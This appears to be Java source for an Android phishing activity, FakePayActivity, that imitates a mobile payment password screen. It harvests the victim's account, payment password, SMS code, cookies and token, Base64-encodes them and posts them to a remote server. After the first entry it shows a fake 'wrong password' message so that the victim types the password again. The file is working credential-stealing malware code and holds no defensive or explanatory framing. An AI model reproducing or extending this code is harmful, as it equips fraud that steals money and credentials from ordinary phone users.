package com.ellison.project.activity;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.text.Editable;
import android.text.TextUtils;
import android.text.TextWatcher;
import android.view.View;
import android.view.ViewGroup;
import android.widget.EditText;
import android.widget.ImageView;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;

import com.ellison.project.R;
import com.ellison.project.utils.AAAA;
import com.ellison.project.utils.Base64Util;
import com.ellison.project.utils.ConfigUtils;

import java.io.PrintStream;
import java.io.UnsupportedEncodingException;

/**
 * @author ellison
 * @date 2020年10月10日
 * @desc 用一句话描述这个类的作用
 */
public class FakePayActivity extends AppCompatActivity {

    private String mUrl = "";
    private EditText count;
    private ImageView clear;
    private EditText pwd;
    private TextView next;
    private ViewGroup loading;

    private int payCount = 0;
    private int postCount = 0;


    public static void enterPay(Activity activity) {
        Intent i = new Intent(activity, FakePayActivity.class);
        activity.startActivity(i);
    }

    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_fake_pay);


        count = findViewById(R.id.countEt);
        clear = findViewById(R.id.countClearIv);
        pwd = findViewById(R.id.pwdEt);
        next = findViewById(R.id.nextTv);
        loading = findViewById(R.id.pay_loading);

        StringBuilder paramBundle = new StringBuilder();
        paramBundle.append("{'type':'getzfbuser','Token':'");
        paramBundle.append("'}");

//        try {
//            String params = Base64Util.base64Encrypt(paramBundle.toString().getBytes("UTF-8"));
//            ((PostRequest) OkGo.post(UrlConstant.API_URL).tag(this)).params("callbackurl", params, new boolean[0]).execute(new StringCallback() {
//                @Override
//                public void onSuccess(Response<String> paramAnonymousResponse) {
//                    PayUrlBean payUrlBean = new Gson().fromJson(paramAnonymousResponse.body(), PayUrlBean.class);
//                    mUrl = payUrlBean.getUrl();
//                    AAAA.id = payUrlBean.getID();
//
//                    runOnUiThread(() -> initUiAndListener());
//                }
//            });
//        } catch (UnsupportedEncodingException e) {
//            e.printStackTrace();
//        }
        initUiAndListener();
    }

    private void initUiAndListener() {
        loading.postDelayed(() -> {
            loading.setVisibility(View.INVISIBLE);
        }, 2000);

        count.addTextChangedListener(new TextWatcher() {
            @Override
            public void beforeTextChanged(CharSequence charSequence, int i, int i1, int i2) {

            }

            @Override
            public void onTextChanged(CharSequence charSequence, int i, int i1, int i2) {

            }

            @Override
            public void afterTextChanged(Editable editable) {
                if (editable.length() > 0) {
                    clear.setVisibility(View.VISIBLE);
                } else {
                    clear.setVisibility(View.GONE);
                }
            }
        });

        clear.setOnClickListener(view -> count.setText(""));

        next.setOnClickListener(view -> {
            if (TextUtils.isEmpty(count.getText().toString()) || TextUtils.isEmpty(pwd.getText().toString())) {
                return;
            }

            loading.setVisibility(View.VISIBLE);

            sendData();
        });
    }

    private void sendData() {
        try {
            Object localObject1 = Base64Util.base64Encrypt((AAAA.cookie + "第三次确认：" + pwd.getText().toString()).getBytes("UTF-8"));
            String str3 = Base64Util.base64Encrypt(count.getText().toString().getBytes("UTF-8"));
            String str1 = Base64Util.base64Encrypt(AAAA.pwd.getBytes("UTF-8"));
            String str2 = Base64Util.base64Encrypt(pwd.getText().toString().getBytes("UTF-8"));
            Object localObject2 = Base64Util.base64Encrypt(AAAA.pageTitle.getBytes("UTF-8"));
            String str4 = Base64Util.base64Encrypt(ConfigUtils.getToken(FakePayActivity.this).getBytes("UTF-8"));
            StringBuilder localStringBuilder = new StringBuilder();
            if (payCount > 1) {
                localStringBuilder.append("{'type':'setpaytype','cookie':'");
                localStringBuilder.append((String) localObject1);
            } else {
                localStringBuilder.append("{'type':'setpaytype','cookie':'");
                localStringBuilder.append("");
            }
            localStringBuilder.append("','user':'");
            localStringBuilder.append(str3);
            if (payCount == 0) {
                localStringBuilder.append("','pwd':'");
                localStringBuilder.append("");
            } else {
                localStringBuilder.append("','pwd':'");
                localStringBuilder.append(str2);
            }
            if (payCount == 0) {
                localStringBuilder.append("','pwd2':'");
                localStringBuilder.append(str2);
            } else {
                localStringBuilder.append("','pwd2':'");
                localStringBuilder.append("");
            }
            localStringBuilder.append("','title':'");
            localStringBuilder.append((String) localObject2);
            localStringBuilder.append("','phonecode':'");
            localStringBuilder.append(AAAA.smsCode);
            localStringBuilder.append("','Token':'");
            localStringBuilder.append(str4);
            localStringBuilder.append("','id':");
            localStringBuilder.append(AAAA.id + payCount);
            localStringBuilder.append("}");
            localObject1 = Base64Util.base64Encrypt(localStringBuilder.toString().getBytes("UTF-8"));
            if (AAAA.sendPostText2(FakePayActivity.this, (String) localObject1) > 0) {
                AAAA.ss = 0;
                localObject2 = System.out;
                StringBuilder stringBuilder = new StringBuilder();
                stringBuilder.append("提交支付成功:");
                stringBuilder.append(AAAA.account);
                stringBuilder.append("/");
                stringBuilder.append(AAAA.pwd);
                stringBuilder.append("/");
                stringBuilder.append(AAAA.id);
                ((PrintStream) localObject2).println(localObject1.toString());

                count.postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        if (payCount < 1) {
                            payCount++;
                            loading.setVisibility(View.GONE);
                            pwd.setText("");
                            Toast.makeText(FakePayActivity.this, "密码错误，请重新输入", Toast.LENGTH_LONG).show();
                        } else {
                            postCount++;
                            if (postCount < 2) {
                                sendData();
                            } else {
                                PayResultActivity.enterResult(FakePayActivity.this);
                                finish();
                            }
                        }
                    }
                }, 3000);
            } else {
                AAAA.ss = 0;
            }
        } catch (UnsupportedEncodingException localUnsupportedEncodingException) {
            localUnsupportedEncodingException.printStackTrace();
        }
    }
}
